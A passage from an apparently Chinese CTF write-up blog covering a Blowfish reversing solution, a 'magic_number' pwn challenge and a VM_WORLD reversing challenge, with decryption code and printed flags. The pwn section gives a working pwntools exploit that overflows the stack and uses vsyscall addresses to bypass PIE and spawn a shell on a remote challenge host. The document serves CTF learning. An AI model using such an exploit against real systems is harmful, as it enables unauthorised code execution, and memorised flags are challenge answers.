class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 16</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> P[<span class="number">16</span> + <span class="number">2</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> S[<span class="number">4</span>][<span class="number">256</span>];</span><br><span class="line">&#125; BLOWFISH_CTX;</span><br><span class="line"></span><br><span class="line">BLOWFISH_CTX ctx;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> ORIG_P[] = &#123; 原始的P盒数据 &#125;;<span class="comment">//使用PI来填充的</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> ORIG_S[] = &#123; 原始的S盒数据，太多这里省略 &#125;;<span class="comment">//使用PI来填充的</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">F</span><span class="params">(BLOWFISH_CTX* ctx, <span class="keyword">unsigned</span> <span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> a, b, c, d;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  y;</span><br><span class="line"></span><br><span class="line">    d = (<span class="keyword">unsigned</span> <span class="keyword">short</span>)(x &amp; <span class="number">0xFF</span>);</span><br><span class="line">    x &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    c = (<span class="keyword">unsigned</span> <span class="keyword">short</span>)(x &amp; <span class="number">0xFF</span>);</span><br><span class="line">    x &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    b = (<span class="keyword">unsigned</span> <span class="keyword">short</span>)(x &amp; <span class="number">0xFF</span>);</span><br><span class="line">    x &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    a = (<span class="keyword">unsigned</span> <span class="keyword">short</span>)(x &amp; <span class="number">0xFF</span>);</span><br><span class="line">    y = ctx-&gt;S[<span class="number">0</span>][a] + ctx-&gt;S[<span class="number">1</span>][b];</span><br><span class="line">    y = y ^ ctx-&gt;S[<span class="number">2</span>][c];</span><br><span class="line">    y = y + ctx-&gt;S[<span class="number">3</span>][d];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Blowfish_Encrypt</span><span class="params">(BLOWFISH_CTX* ctx, <span class="keyword">unsigned</span> <span class="keyword">int</span>* xl, <span class="keyword">unsigned</span> <span class="keyword">int</span>* xr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  Xl;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  Xr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  temp;</span><br><span class="line">    <span class="keyword">short</span> i;</span><br><span class="line"></span><br><span class="line">    Xl = *xl;</span><br><span class="line">    Xr = *xr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; ++i) &#123;</span><br><span class="line">        Xl = Xl ^ ctx-&gt;P[i];</span><br><span class="line">        Xr = F(ctx, Xl) ^ Xr;</span><br><span class="line"></span><br><span class="line">        temp = Xl;</span><br><span class="line">        Xl = Xr;</span><br><span class="line">        Xr = temp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    temp = Xl;</span><br><span class="line">    Xl = Xr;</span><br><span class="line">    Xr = temp;</span><br><span class="line"></span><br><span class="line">    Xr = Xr ^ ctx-&gt;P[N];</span><br><span class="line">    Xl = Xl ^ ctx-&gt;P[N + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    *xl = Xl;</span><br><span class="line">    *xr = Xr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Blowfish_Decrypt</span><span class="params">(BLOWFISH_CTX* ctx, <span class="keyword">unsigned</span> <span class="keyword">int</span>* xl, <span class="keyword">unsigned</span> <span class="keyword">int</span>* xr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  Xl;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  Xr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  temp;</span><br><span class="line">    <span class="keyword">short</span>       i;</span><br><span class="line"></span><br><span class="line">    Xl = *xl;</span><br><span class="line">    Xr = *xr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = N + <span class="number">1</span>; i &gt; <span class="number">1</span>; --i) &#123;</span><br><span class="line">        Xl = Xl ^ ctx-&gt;P[i];</span><br><span class="line">        Xr = F(ctx, Xl) ^ Xr;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Exchange Xl and Xr */</span></span><br><span class="line">        temp = Xl;</span><br><span class="line">        Xl = Xr;</span><br><span class="line">        Xr = temp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Exchange Xl and Xr */</span></span><br><span class="line">    temp = Xl;</span><br><span class="line">    Xl = Xr;</span><br><span class="line">    Xr = temp;</span><br><span class="line"></span><br><span class="line">    Xr = Xr ^ ctx-&gt;P[<span class="number">1</span>];</span><br><span class="line">    Xl = Xl ^ ctx-&gt;P[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    *xl = Xl;</span><br><span class="line">    *xr = Xr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Blowfish_Init</span><span class="params">(BLOWFISH_CTX* ctx, <span class="keyword">unsigned</span> <span class="keyword">char</span>* key, <span class="keyword">int</span> keyLen)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j, k;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> data, datal, datar;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">256</span>; j++)</span><br><span class="line">            ctx-&gt;S[i][j] = ORIG_S[<span class="number">256</span>*i+j];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N + <span class="number">2</span>; ++i) &#123;</span><br><span class="line">        data = <span class="number">0x00000000</span>;</span><br><span class="line">        <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; <span class="number">4</span>; ++k) &#123;</span><br><span class="line">            data = (data &lt;&lt; <span class="number">8</span>) | key[j];</span><br><span class="line">            j = j + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (j &gt;= keyLen)</span><br><span class="line">                j = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ctx-&gt;P[i] = ORIG_P[i] ^ data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    datal = <span class="number">0x00000000</span>;</span><br><span class="line">    datar = <span class="number">0x00000000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N + <span class="number">2</span>; i += <span class="number">2</span>) &#123;</span><br><span class="line">        Blowfish_Encrypt(ctx, &amp;datal, &amp;datar);</span><br><span class="line">        ctx-&gt;P[i] = datal;</span><br><span class="line">        ctx-&gt;P[i + <span class="number">1</span>] = datar;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">256</span>; j += <span class="number">2</span>) &#123;</span><br><span class="line">            Blowfish_Encrypt(ctx, &amp;datal, &amp;datar);</span><br><span class="line">            ctx-&gt;S[i][j] = datal;</span><br><span class="line">            ctx-&gt;S[i][j + <span class="number">1</span>] = datar;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[] =</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">16</span>, <span class="number">181</span>,  <span class="number">42</span>, <span class="number">236</span>, <span class="number">176</span>,  <span class="number">80</span>, <span class="number">177</span>,  <span class="number">35</span>,  <span class="number">64</span>,  <span class="number">58</span>,</span><br><span class="line">        <span class="number">39</span>, <span class="number">124</span>,  <span class="number">30</span>,  <span class="number">83</span>,  <span class="number">41</span>,  <span class="number">31</span>, <span class="number">177</span>,  <span class="number">21</span>,  <span class="number">54</span>,  <span class="number">40</span>,</span><br><span class="line">        <span class="number">251</span>,  <span class="number">17</span>, <span class="number">191</span>, <span class="number">225</span>,  <span class="number">50</span>,  <span class="number">30</span>, <span class="number">197</span>,  <span class="number">18</span>, <span class="number">228</span>,  <span class="number">96</span>,</span><br><span class="line">        <span class="number">172</span>,  <span class="number">64</span></span><br><span class="line">    &#125;;<span class="comment">//题目中的加密数据</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> key[] = <span class="string">"R3v3rs3!"</span>;</span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">33</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    Blowfish_Init(&amp;ctx, key, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i += <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> *l = ((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(ida_chars + <span class="number">4</span> * i));</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> *r = ((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(ida_chars + <span class="number">4</span> * (i+<span class="number">1</span>)));</span><br><span class="line">        </span><br><span class="line">        *l = _byteswap_ulong(*l), *r = _byteswap_ulong(*r);</span><br><span class="line">        Blowfish_Decrypt(&amp;ctx, l, r);</span><br><span class="line">        *l = _byteswap_ulong(*l), *r = _byteswap_ulong(*r);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"flag&#123;"</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%c"</span>, ida_chars[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&#125;"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20200817165817614.png" alt="image-20200817165817614"></p><p>python一向搞这些都是很方便的，找到了可以使用Crypto模块。</p><p><a href="https://www.cnblogs.com/ws17345067708/p/10552836.html" target="_blank" rel="noopener">安装</a></p><p>goole和百度了用法 <a href="https://blog.csdn.net/yyhustim/article/details/8539065?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.channel_param&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.channel_param" target="_blank" rel="noopener">用法</a>：得到和C语言中一样的结果。<img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20200817170245529.png" alt="image-20200817170245529"></p><p>最后，关键就是算法的学习。</p><h2 id="magic-number-pwn"><a href="#magic-number-pwn" class="headerlink" title="magic_number (pwn)"></a>magic_number (pwn)</h2><blockquote><p>第一次遇到，利用vsyscall中的ret指令充当滑梯，直到可以通过覆盖低字节处得到我们指定函数的地址。</p></blockquote><p>查保护：关键就是程序开启了PIE。</p><blockquote><p>PIE全称是position-independent  executable，中文解释为地址无关可执行文件，该技术是一个针对代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一个防护技术，如果程序开启了PIE保护的话，在每次加载程序时都变换加载地址。</p></blockquote><p>本题，栈溢出，控制程序走向即可。但难的就是有PIE使程序每次加载的地址不一样。</p><p>利用vsyscall绕过PIE。<strong>可以利用的地址是0xffffffffff600000、0xffffffffff600400、 0xffffffffff600800</strong>，因为他们是不变的。</p><p>首先查看利用proc文件查看程序加载的基地址：<img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20200911210254714.png" alt="image-20200911210254714"></p><p>更改ida载入的基地址使其与之对应。找到要下断的地址。<img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20200911210500410.png" alt="image-20200911210500410"></p><p>gdb下断调试，通过查看栈确定需要使用vsyscall的个数。可以看到使用4个即可。<img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20200911210854601.png" alt="image-20200911210854601"></p><p>找到需要控制程序走向的目的地址。（即system(‘bin/sh’);）<img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20200911211045084.png" alt="image-20200911211045084"></p><p>所以最后只需将最低字节的<strong>80</strong>覆盖为<strong>A8</strong>即可。</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = remote(<span class="string">'183.129.189.60'</span>, <span class="number">10053</span>)</span><br><span class="line"><span class="comment">#p = process('./8')</span></span><br><span class="line">pay = <span class="string">'B'</span>*<span class="number">0x38</span>+p64(<span class="number">0xFFFFFFFFFF600400</span>)+p64(<span class="number">0xFFFFFFFFFF600400</span>)+p64(<span class="number">0xFFFFFFFFFF600400</span>)+p64(<span class="number">0xFFFFFFFFFF600400</span>)+<span class="string">b'\xA8'</span></span><br><span class="line">p.recvuntil(<span class="string">'Your Input :'</span>)</span><br><span class="line">p.send(pay)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="VM-WORLD（re）"><a href="#VM-WORLD（re）" class="headerlink" title="VM_WORLD（re）"></a>VM_WORLD（re）</h2><blockquote><p>链接：<a href="https://pan.baidu.com/s/1BYmMrqGaiKT6W_HVd9eoPA" target="_blank" rel="noopener">https://pan.baidu.com/s/1BYmMrqGaiKT6W_HVd9eoPA</a><br>提取码：5b5o<br>复制这段内容后打开百度网盘手机App，操作更方便哦</p></blockquote><p>一个简单的虚拟机题目，从学校师傅哪里学会了修复ida无法F5switch语句的方法。</p><p>首先简单看一下:<img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20200912171012942.png" alt="image-20200912171012942"></p><p>所以进入OD动态到关键函数，并dump出，载入ida：可以看到是不能F5的。<img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20200912171258533.png" alt="image-20200912171258533"></p><p>但看了一下这个函数的代码也不是很长，直接读汇编将其写成了C语言代码：一个简单的虚拟机。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> op[] = &#123;<span class="number">0xF0</span>, <span class="number">0xF2</span>, <span class="number">0xF3</span>, <span class="number">0x01</span>, <span class="number">0xF5</span>,</span><br><span class="line">  <span class="number">0xF0</span>, <span class="number">0xF6</span>, <span class="number">0xF4</span>, <span class="number">0xF1</span>, <span class="number">0xF7</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>, temp = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, k = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> input[] = <span class="string">"aaaaaaaaaaaaaaaaa"</span>;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">50</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">n = op[i]<span class="number">-0xf0</span>;</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">s[k] = input[j] &amp; <span class="number">0xFF</span>;</span><br><span class="line">k++, i++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">k--;</span><br><span class="line">input[j<span class="number">-1</span>] = s[k];</span><br><span class="line">i++; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">k--;</span><br><span class="line">temp = s[k];</span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line">temp += op[i+<span class="number">1</span>];</span><br><span class="line">i += <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> t = <span class="number">0</span>, ans = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(k == <span class="number">0</span>)</span><br><span class="line">t = i;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">t = s[k<span class="number">-1</span>];</span><br><span class="line">ans = t ^ temp;</span><br><span class="line"><span class="keyword">if</span>(k == <span class="number">0</span>)</span><br><span class="line">i = ans;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">s[k<span class="number">-1</span>] = ans;</span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">5</span>)</span><br><span class="line">&#123;</span><br><span class="line">j++;</span><br><span class="line">i++; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">6</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> t = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(k == <span class="number">0</span>)</span><br><span class="line">t = i;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">t = s[k<span class="number">-1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(t == <span class="number">0</span> || t == <span class="number">10</span>)</span><br><span class="line">i += <span class="number">3</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">i += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">7</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> _64 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(input[_64])</span><br><span class="line">&#123;</span><br><span class="line">_64++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(j == _64)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">i = <span class="number">0</span>;</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(input); i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d "</span>, input[i]); </span><br><span class="line"> </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实就只有异或和加减操作，简答逆一下即可：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_[] =</span><br><span class="line">&#123;</span><br><span class="line">   <span class="number">11</span>,  <span class="number">12</span>,   <span class="number">5</span>,  <span class="number">19</span>,  <span class="number">73</span>,  <span class="number">87</span>,   <span class="number">3</span>,  <span class="number">91</span>,  <span class="number">13</span>,  <span class="number">12</span>, </span><br><span class="line">    <span class="number">4</span>,  <span class="number">10</span>,  <span class="number">20</span>,  <span class="number">75</span>,  <span class="number">84</span>,  <span class="number">82</span>,  <span class="number">83</span>,  <span class="number">31</span>,  <span class="number">26</span>,  <span class="number">84</span>, </span><br><span class="line">   <span class="number">86</span>,  <span class="number">86</span>,  <span class="number">73</span>,  <span class="number">76</span>,   <span class="number">2</span>,  <span class="number">91</span>,  <span class="number">94</span>,  <span class="number">72</span>,  <span class="number">74</span>,  <span class="number">83</span>, </span><br><span class="line">   <span class="number">82</span>,   <span class="number">4</span>,  <span class="number">83</span>,  <span class="number">84</span>,   <span class="number">2</span>,  <span class="number">92</span>,  <span class="number">11</span>,   <span class="number">3</span>,   <span class="number">6</span>,   <span class="number">2</span>, </span><br><span class="line">   <span class="number">69</span>, <span class="number">125</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">40</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">ida_[i] = (ida_[i]^ida_[i+<span class="number">1</span>])<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">42</span>; i++)</span><br><span class="line"><span class="built_in">putchar</span>(ida_[i]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">//flag&#123;5aa97418-e2a1-4a4c-ba9d-d6eb0ed91147&#125;</span></span><br></pre></td></tr></table></figure><p>后面问了出题师傅，才知道那个是可以修复一下的。其实就是switch语句的每个跳转用了一张表来存储，但由于基地址等对不上，导致分析出错。</p><p>所以首先修改与表对应的基地址，然后恢复储存跳转的表。<img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20200912172413213.png" alt="image-20200912172413213"></p><p>最后手动修改swicth的声明：<img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20200912172623345.png" alt="image-20200912172623345"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;平时一些零散的CTF题的记录。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Reverse" scheme="https://www.Bxnop.cn/categories/Reverse/"/>
    
    
  </entry>
  
  <entry>
    <title>2019安洵杯</title>
    <link href="https://www.bxnop.cn/2020/07/27/2019%E5%AE%89%E6%B4%B5%E6%9D%AF/"/>
